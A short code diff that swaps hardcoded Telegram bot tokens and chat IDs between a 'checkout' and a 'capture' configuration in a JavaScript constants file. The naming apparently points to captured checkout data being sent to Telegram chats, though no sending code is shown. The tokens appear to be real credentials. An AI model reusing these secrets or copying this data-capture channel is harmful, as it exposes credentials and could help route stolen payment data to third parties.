@@ -46,13 +46,13 @@ export const STATUS_CODES = {
 
 // Telegram configuration
 export const CHECKOUT_TELEGRAM_CONFIG = {
-    BOT_TOKEN: '8432314500:AAFgLWr6uD-VBj-y2uyAxuAyPrFQ5oIZH6c',
-    CHAT_ID: '-5269167790'
+    BOT_TOKEN: '8563476678:AAG9Xd95Tdg-MkovuTy_WzHOmcEMCMAo55w',
+    CHAT_ID: '-5175091667'
 };
 
 export const CAPTURE_TELEGRAM_CONFIG = {
-    BOT_TOKEN: '8563476678:AAG9Xd95Tdg-MkovuTy_WzHOmcEMCMAo55w',
-    CHAT_ID: '-5175091667'
+    BOT_TOKEN: '8432314500:AAFgLWr6uD-VBj-y2uyAxuAyPrFQ5oIZH6c',
+    CHAT_ID: '-5269167790'
 };
 
 // Legacy (kept for safety if used elsewhere)
